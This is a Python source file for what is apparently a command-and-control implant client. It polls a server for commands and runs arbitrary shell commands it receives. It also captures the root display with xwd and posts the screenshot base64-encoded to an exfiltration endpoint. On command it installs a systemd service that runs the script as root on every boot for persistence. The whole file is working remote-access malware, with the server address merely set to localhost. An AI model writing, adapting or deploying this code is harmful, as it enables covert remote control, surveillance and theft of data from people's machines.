#!/usr/bin/env python3

import os.path
import socket
from datetime import datetime
import time
import random
import uuid
from platform import node
import requests
import json
import string
import subprocess
import base64
import fcntl, sys

lock_file = '/var/lock/program.lock'
if not os.path.exists(lock_file):
    os.mknod(lock_file)
fp = open(lock_file, 'r+')
try:
    UUID = fp.read()
    if not str(UUID):
        UUID = uuid.uuid1()
        fp.seek(0)
        fp.write(str(UUID))
        fp.truncate()
    fcntl.lockf(fp, fcntl.LOCK_EX | fcntl.LOCK_NB)
except IOError:
    sys.exit(0)

SERVER_IP = "localhost"
SERVER_PORT = 8000
BUFFER_SIZE = 2048
OS = subprocess.Popen("lsb_release -d | cut -d ':' -f2", shell=True, stdout = subprocess.PIPE).communicate()[0].strip()
HOSTNAME = node().strip()
MAX_FAILS = 10
failCount = 0
LOW_TIME = 1
HIGH_TIME = 10
CWD = os.getcwd()

def beacon():
    r = requests.get(url = str("http://" + SERVER_IP + ":" + str(SERVER_PORT) + "/client/" + str(UUID) + "/commands"))
    return r.text

def httpPost(directory, exfilData, exfilFile):
    encoded = base64.encodebytes(exfilData)
    data = {'UUID':UUID,
            'OS':OS,
            'HOSTNAME':HOSTNAME,
            'MAX_FAILS':MAX_FAILS,
            'LOW_TIME':LOW_TIME,
            'HIGH_TIME':HIGH_TIME,
            'EXFIL_DATA':base64.b64encode(exfilData)}
    if exfilFile:
        files = {'exfilFile': exfilFile}
    else:
        files = ""
    r = requests.post(url = str("http://" + SERVER_IP + ":" + str(SERVER_PORT) + "/" + directory), data = data, files=files)


if __name__ == "__main__":
    print("Starting client")
    while failCount < MAX_FAILS:
        try:
            data = ""
            data =  beacon()
            print("BEACONED")
            failCount = 0
            time.sleep(5)
        except:
            failCount += 1
            print("FAILS: " + str(failCount))
        if data != "{}" and data:
            print(data)
            serverText = json.loads(data)
            print(serverText["command"])
            print(serverText["args"])
            if serverText["command"] == "EXECUTE":
                os.popen(serverText["args"])
            elif serverText["command"] == "UPDATE":
                httpPost("update", b"", "")
            elif serverText["command"] == "KILL":
                exit()
            elif serverText["command"] == "SCREENSHOT":
                fileName = str(time.time()) + ".xwd"
                image = subprocess.Popen("xwd -silent -root -display :0.0", shell=True, stdout = subprocess.PIPE).communicate()[0]
                httpPost("exfil", image, "")
            elif serverText["command"] == "SYSTEMD":
                f = open('/etc/systemd/system/client-program.service','w')
                f.write("[Unit]\nAfter=network.target\nStartLimitIntervalSec=0\n\n[Service]\nType=simple\nRestart=always\nRestartSec=1\nUser=root\nExecStart=/usr/bin/env python3 " + CWD + "/client.py\n\n[Install]\nWantedBy=multi-user.target")
                f.close()
                subprocess.Popen("systemctl enable --now client-program", shell=True)

        time.sleep(random.randint(LOW_TIME,HIGH_TIME))
